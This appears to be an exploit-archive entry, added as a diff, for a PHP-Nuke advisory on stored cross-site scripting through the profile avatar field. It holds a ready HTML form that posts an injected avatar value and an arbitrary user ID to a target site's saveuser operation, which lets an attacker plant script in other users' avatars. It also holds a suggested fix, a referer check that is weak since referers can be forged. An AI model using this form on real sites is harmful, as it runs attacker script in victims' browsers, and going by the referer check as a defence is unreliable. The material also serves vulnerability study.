@@ -1,0 +1,50 @@
+source: http://www.securityfocus.com/bid/6750/info
+
+A problem with PHP-Nuke could allow remote users to execute arbitrary code in the context of the web site. The problem is in the lack of sanitization of some types of input.
+
+PHP-Nuke does not sanitize code submitted to a site from the avatar select box. Due to this, a malicious user may be able to submit embedded code from their profile page instead of an avatar. This would result in code being executed in the location where a user's avatar should normally display. This code would be executed by a victim user's browser in the context of the site.
+
+<!-- START CODE --!>
+<form name="Register"
+action="http://NUKEDSITE/modules.php?name=Your_Account" method="post">
+
+<b>Code ('">[code]<b ')</b><input type="text" name="user_avatar" size="30"
+maxlength="30"><br><br>
+
+<b>Username</b><input type="text" name="uname" size="30"
+maxlength="255"><br><b>User ID:<input type="text" name="uid"
+size="30"><input type="hidden" name="op" value="saveuser"><input
+type="submit" value="Save Changes"></form>
+<!-- END CODE --!>
+
+
+To modify other users avatar information:
+
+Search for "saveuser" you should get to a function that looks like this..
+
+function saveuser($uid, $realname, $uname, $email, etc...
+
+right underneath the function call, put this in..
+
+$referer = getenv("HTTP_REFERER");
+$nukeurl="http://digital-delusions.com";
+$nukeurl2="http://digital-delusions.dyn.ee";
+$nukeurl3="http://192.168.0.254";
+if (substr("$referer",0,strlen($nukeurl))==$nukeurl OR
+substr("$referer",0,strlen($nukeurl2))==$nukeurl2 OR
+substr("$referer",0,strlen($nukeurl3))==$nukeurl3) {
+
+make sure u change my URLs to your site's urls.
+
+[ ... ]
+
+Header("Location: modules.php?name=$module_name");
+}
+}
+}
+
+before the last "}" paste this..
+
+} else {
+echo "delusion ownz j00";
+}
